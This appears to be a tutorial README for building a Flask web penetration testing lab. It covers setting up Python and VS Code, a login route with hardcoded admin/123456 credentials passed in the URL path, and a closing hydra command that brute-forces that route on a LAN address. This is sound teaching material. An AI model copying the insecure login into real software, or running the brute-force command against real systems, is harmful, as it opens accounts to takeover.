# Setting up Web Penetration Testing LAB
- Author: `Anthoniraj Amalanathan`
- Description: Python Flask Web Services for Demonstrating various Web Penetration Testing for educational purpose.

## Install Python and Flask Framework
- Download and Install Python for Windows from the following Link,
    - https://www.python.org/downloads/
    - Note: Latest Linux OS comes with Python3 as default.
- After Installing Python, Create a Virtual Environment,
    - `python -m venv webpentest`
- To activate virtual environment
    - `webpentest/Scripts/activate`
- Install Python Dependencies (E.g. Flask)
    - `pip install flask`
- To deactivate virtual environment
    - Type `deactivate` in Virtual Environment Terminal

## Setup Visual Studio Code and Python Plugin
- Download and Install VS Code 
    - `https://code.visualstudio.com/download`
- After installing VS Code, Install Python Extension
    - `https://marketplace.visualstudio.com/items?itemName=ms-python.python`
- Install Flask Extension
    - `https://marketplace.visualstudio.com/items?itemName=cstrap.flask-snippets`
- Now, Open your project folder (E.g. pentest) for Python Flask development

## Create a Flask Script for Testing 
- Create a File app.py in project folder 
- Activate the Virtual Environment 
    - Click on the Python Interpreter name in bottom right corner of VS Code
    - Select the Virtual Enviroment Folder from Specific Path (E.g. C:\users\naathan\webpentest\Scripts\python.exe)
- write the hello world script in app.py
```python
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return 'Hello World!'

if __name__ == '__main__':
    app.run(debug=True)
```
- Open the terminal and run the flask application
    - `python app.py`

- Access the URL http://127.0.0.1:5000/ in your web browser

- Create Login Service in app.py
```python
@app.route("/login/<username>/<password>")
def verify_login(username, password):
    if username == "admin" and password == "123456":
        return "Welcome to Admin Portal"
    else:
        return "Unauthorised User"
```
- Login Page Bruteforce Attack in Kali Linux
    - `curl http://192.168.1.101:8080/login/admin/123456`
    - `hydra -l admin -P mypass.txt  192.168.1.101 -s 8080  http-get "/login/^USER^/^PASS^" -vV -f`